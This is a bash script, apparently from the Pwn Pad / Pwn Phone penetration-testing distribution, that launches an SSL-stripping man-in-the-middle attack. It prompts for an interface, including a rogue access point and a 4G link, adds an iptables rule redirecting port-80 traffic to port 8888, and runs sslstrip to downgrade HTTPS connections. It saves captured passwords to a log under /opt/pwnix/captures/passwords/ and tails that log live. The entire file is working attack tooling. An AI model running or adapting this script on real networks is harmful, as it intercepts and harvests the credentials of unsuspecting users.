#!/bin/bash
# SSL strip script for sniffing on available interfaces

trap f_clean_up INT
trap f_clean_up KILL

##################################################
f_identify_device(){

# Check device
  hardw=`getprop ro.hardware`
  if [[ "$hardw" == "deb" || "$hardw" == "flo" ]]; then
    # Set interface for new Pwn Pad
    gsm_int="rmnet_usb0"
  else
    # Set interface for Pwn Phone and old Pwn Pad
    gsm_int="rmnet0"
  fi
}

##################################################
# Cleanup function to ensure sslstrip stops and iptable rules stop
f_clean_up(){
  echo
  echo "[!] Killing other instances of sslstrip and flushing iptables"
  echo
  killall sslstrip

  # Remove SSL Strip iptables rule ONLY
  iptables -t nat -D PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8888
}

##################################################
f_interface(){
  clear
  echo "Select which interface to sniff on (1-6):"
  echo
  echo "1. eth0  (USB Ethernet adapter)"
  echo "2. wlan0  (internal Wifi)"
  echo "3. wlan1  (USB TP-Link adapter)"
  echo "4. mon0  (monitor mode interface)"
  echo "5. at0  (Use with EvilAP)"
  echo "6. $gsm_int (4G GSM connection)"
  echo

  read -p "Choice: " interfacechoice

  case $interfacechoice in
    1) interface=eth0 ;;
    2) interface=wlan0 ;;
    3) interface=wlan1 ;;
    4) interface=mon0 ;;
    5) interface=at0 ;;
    6) interface=$gsm_int ;;
    *) f_interface ;;
esac
}


# Setup iptables for sslstrip
f_ip_tables(){
  iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8888
}

f_run(){
  # Path to sslstrip definitions
  clear
  echo
  echo "Logs saved to /opt/pwnix/captures/passwords/"
  echo
  sleep 2

  f_interface
  f_ip_tables

  logfile=/opt/pwnix/captures/passwords/sslstrip_$(date +%F-%H%M).log

  sslstrip -pfk -w $logfile  -l 8888 $interface &

  sleep 3
  echo
  echo
  tail -f $logfile
}

f_identify_device
f_run
f_clean_up
